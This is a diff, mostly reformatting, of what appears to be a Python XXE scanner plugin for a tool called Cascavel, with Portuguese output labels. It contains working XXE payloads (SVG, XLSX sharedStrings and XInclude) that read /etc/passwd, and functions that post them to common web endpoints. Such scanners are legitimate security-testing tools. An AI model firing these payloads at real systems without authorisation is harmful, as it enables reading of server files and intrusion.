@@ -1,13 +1,28 @@
 # plugins/xxe_scanner.py — Cascavel 2026 Intelligence
-import requests
 import base64
 
+import requests
 
 ENDPOINTS = [
-    "/", "/api/", "/api/v1/", "/upload", "/import", "/parse",
-    "/xmlrpc.php", "/soap", "/wsdl", "/feed", "/api/xml",
-    "/api/v1/import", "/api/v1/export", "/rss", "/atom",
-    "/api/soap", "/ws", "/xmlrpc", "/api/upload",
+    "/",
+    "/api/",
+    "/api/v1/",
+    "/upload",
+    "/import",
+    "/parse",
+    "/xmlrpc.php",
+    "/soap",
+    "/wsdl",
+    "/feed",
+    "/api/xml",
+    "/api/v1/import",
+    "/api/v1/export",
+    "/rss",
+    "/atom",
+    "/api/soap",
+    "/ws",
+    "/xmlrpc",
+    "/api/upload",
 ]
 
 CONTENT_TYPES = [
@@ -20,9 +35,20 @@ CONTENT_TYPES = [
 ]
 
 XML_PARSER_ERRORS = [
-    "xml parsing", "entity", "doctype", "dtd", "xmlparseentity",
-    "simplexml_load", "domparser", "saxparser", "lxml", "expat",
-    "xerces", "javax.xml", "org.xml.sax", "xmlreader",
+    "xml parsing",
+    "entity",
+    "doctype",
+    "dtd",
+    "xmlparseentity",
+    "simplexml_load",
+    "domparser",
+    "saxparser",
+    "lxml",
+    "expat",
+    "xerces",
+    "javax.xml",
+    "org.xml.sax",
+    "xmlreader",
 ]
 
 # ──────────── CLASSIC XXE PAYLOADS ────────────
@@ -71,16 +97,16 @@ BLIND_PAYLOADS = [
 ]
 
 # ──────────── XXE IN FILE UPLOADS (SVG, XLSX, DOCX) ────────────
-SVG_XXE = '''<?xml version="1.0" encoding="UTF-8"?>
+SVG_XXE = """<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
 <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
 <text x="0" y="20">&xxe;</text>
-</svg>'''
+</svg>"""
 
-XLSX_XXE_SHARED_STRINGS = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+XLSX_XXE_SHARED_STRINGS = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
 <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
 <sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
-<si><t>&xxe;</t></si></sst>'''
+<si><t>&xxe;</t></si></sst>"""
 
 # ──────────── ENCODING BYPASS ────────────
 ENCODING_PAYLOADS = [
@@ -97,7 +123,9 @@ ENCODING_PAYLOADS = [
 ]
 
 # ──────────── XINCLUDE ────────────
-XINCLUDE_PAYLOAD = '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>'
+XINCLUDE_PAYLOAD = (
+    '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>'
+)
 
 
 def _test_classic_xxe(target, endpoint):
@@ -108,24 +136,31 @@ def _test_classic_xxe(target, endpoint):
     for payload in CLASSIC_PAYLOADS:
         for ct in CONTENT_TYPES[:3]:
             try:
-                resp = requests.post(url, data=payload["xml"], timeout=8,
-                                      headers={"Content-Type": ct})
+                resp = requests.post(url, data=payload["xml"], timeout=8, headers={"Content-Type": ct})
                 if resp.status_code == 200:
                     if payload["indicador"] and payload["indicador"] in resp.text:
-                        vulns.append({
-                            "tipo": "XXE", "subtipo": payload["nome"],
-                            "endpoint": endpoint, "content_type": ct,
-                            "severidade": "CRITICO",
-                            "descricao": f"XXE confirmado via {payload['nome']}!",
-                            "amostra": resp.text[:300],
-                        })
+                        vulns.append(
+                            {
+                                "tipo": "XXE",
+                                "subtipo": payload["nome"],
+                                "endpoint": endpoint,
+                                "content_type": ct,
+                                "severidade": "CRITICO",
+                                "descricao": f"XXE confirmado via {payload['nome']}!",
+                                "amostra": resp.text[:300],
+                            }
+                        )
                         break
                     elif any(kw in resp.text.lower() for kw in XML_PARSER_ERRORS):
-                        vulns.append({
-                            "tipo": "XXE_PARSER_DETECTED", "subtipo": payload["nome"],
-                            "endpoint": endpoint, "severidade": "MEDIO",
-                            "descricao": "XML parser detectado — superfície de ataque XXE!",
-                        })
+                        vulns.append(
+                            {
+                                "tipo": "XXE_PARSER_DETECTED",
+                                "subtipo": payload["nome"],
+                                "endpoint": endpoint,
+                                "severidade": "MEDIO",
+                                "descricao": "XML parser detectado — superfície de ataque XXE!",
+                            }
+                        )
             except Exception:
                 continue
     return vulns
@@ -139,16 +174,19 @@ def _test_blind_xxe(target, endpoint):
     for payload in BLIND_PAYLOADS:
         for ct in CONTENT_TYPES[:2]:
             try:
-                resp = requests.post(url, data=payload["xml"], timeout=8,
-                                      headers={"Content-Type": ct})
+                resp = requests.post(url, data=payload["xml"], timeout=8, headers={"Content-Type": ct})
                 # Blind XXE não retorna dados — marcar como injetado
                 if resp.status_code in (200, 500, 400):
-                    vulns.append({
-                        "tipo": "XXE_BLIND_INJECTED", "subtipo": payload["nome"],
-                        "endpoint": endpoint, "content_type": ct,
-                        "severidade": "ALTO",
-                        "descricao": f"Blind XXE payload injetado ({payload['nome']}) — verificar OOB callback!",
-                    })
+                    vulns.append(
+                        {
+                            "tipo": "XXE_BLIND_INJECTED",
+                            "subtipo": payload["nome"],
+                            "endpoint": endpoint,
+                            "content_type": ct,
+                            "severidade": "ALTO",
+                            "descricao": f"Blind XXE payload injetado ({payload['nome']}) — verificar OOB callback!",
+                        }
+                    )
                     break
             except Exception:
                 continue
@@ -166,17 +204,23 @@ def _test_svg_upload(target):
             files = {"file": ("test.svg", SVG_XXE, "image/svg+xml")}
             resp = requests.post(url, files=files, timeout=8)
             if "root:" in resp.text:
-                vulns.append({
-                    "tipo": "XXE_SVG_UPLOAD", "endpoint": ep,
-                    "severidade": "CRITICO",
-                    "descricao": "XXE via SVG upload — file read confirmado!",
-                })
+                vulns.append(
+                    {
+                        "tipo": "XXE_SVG_UPLOAD",
+                        "endpoint": ep,
+                        "severidade": "CRITICO",
+                        "descricao": "XXE via SVG upload — file read confirmado!",
+                    }
+                )
             elif resp.status_code in (200, 201):
-                vulns.append({
-                    "tipo": "XXE_SVG_INJECTED", "endpoint": ep,
-                    "severidade": "ALTO",
-                    "descricao": "SVG XXE payload aceito pelo upload — verificar renderização!",
-                })
+                vulns.append(
+                    {
+                        "tipo": "XXE_SVG_INJECTED",
+                        "endpoint": ep,
+                        "severidade": "ALTO",
+                        "descricao": "SVG XXE payload aceito pelo upload — verificar renderização!",
+                    }
+                )
         except Exception:
             continue
     return vulns
@@ -191,14 +235,23 @@ def _test_xlsx_xxe(target):
         url = f"http://{target}{ep}"
         try:
             # Enviar como XLSX content (seria um ZIP real, mas testamos parsing)
-            files = {"file": ("test.xlsx", XLSX_XXE_SHARED_STRINGS.encode(), "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet")}
+            files = {
+                "file": (
+                    "test.xlsx",
+                    XLSX_XXE_SHARED_STRINGS.encode(),
+                    "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
+                )
+            }
             resp = requests.post(url, files=files, timeout=8)
             if "root:" in resp.text:
-                vulns.append({
-                    "tipo": "XXE_XLSX", "endpoint": ep,
-                    "severidade": "CRITICO",
-                    "descricao": "XXE via XLSX upload (sharedStrings.xml)!",
-                })
+                vulns.append(
+                    {
+                        "tipo": "XXE_XLSX",
+                        "endpoint": ep,
+                        "severidade": "CRITICO",
+                        "descricao": "XXE via XLSX upload (sharedStrings.xml)!",
+                    }
+                )
         except Exception:
             continue
     return vulns
@@ -208,11 +261,11 @@ def _test_xinclude(target, endpoint):
     """Testa XInclude injection (quando não se controla DOCTYPE)."""
     url = f"http://{target}{endpoint}"
     try:
-        resp = requests.post(url, data=XINCLUDE_PAYLOAD, timeout=6,
-                              headers={"Content-Type": "application/xml"})
+        resp = requests.post(url, data=XINCLUDE_PAYLOAD, timeout=6, headers={"Content-Type": "application/xml"})
         if "root:" in resp.text:
             return {
-                "tipo": "XINCLUDE_INJECTION", "endpoint": endpoint,
+                "tipo": "XINCLUDE_INJECTION",
+                "endpoint": endpoint,
                 "severidade": "CRITICO",
                 "descricao": "XInclude injection — file read confirmado!",
             }
@@ -227,14 +280,17 @@ def _test_encoding_bypass(target, endpoint):
     url = f"http://{target}{endpoint}"
     for payload in ENCODING_PAYLOADS:
         try:
-            resp = requests.post(url, data=payload["xml"], timeout=8,
-                                  headers={"Content-Type": "application/xml"})
+            resp = requests.post(url, data=payload["xml"], timeout=8, headers={"Content-Type": "application/xml"})
             if payload["indicador"] and payload["indicador"] in resp.text:
-                vulns.append({
-                    "tipo": "XXE_ENCODING_BYPASS", "subtipo": payload["nome"],
-                    "endpoint": endpoint, "severidade": "CRITICO",
-                    "descricao": f"XXE via {payload['nome']} encoding bypass!",
-                })
+                vulns.append(
+                    {
+                        "tipo": "XXE_ENCODING_BYPASS",
+                        "subtipo": payload["nome"],
+                        "endpoint": endpoint,
+                        "severidade": "CRITICO",
+                        "descricao": f"XXE via {payload['nome']} encoding bypass!",
+                    }
+                )
         except Exception:
             continue
     return vulns
@@ -277,7 +333,14 @@ def run(target, ip, open_ports, banners):
     return {
         "plugin": "xxe_scanner",
         "versao": "2026.1",
-        "tecnicas": ["classic_xxe", "blind_oob", "svg_upload", "xlsx_upload",
-                      "xinclude", "encoding_bypass", "content_type_switch"],
+        "tecnicas": [
+            "classic_xxe",
+            "blind_oob",
+            "svg_upload",
+            "xlsx_upload",
+            "xinclude",
+            "encoding_bypass",
+            "content_type_switch",
+        ],
         "resultados": vulns if vulns else "Nenhum XXE detectado",
     }
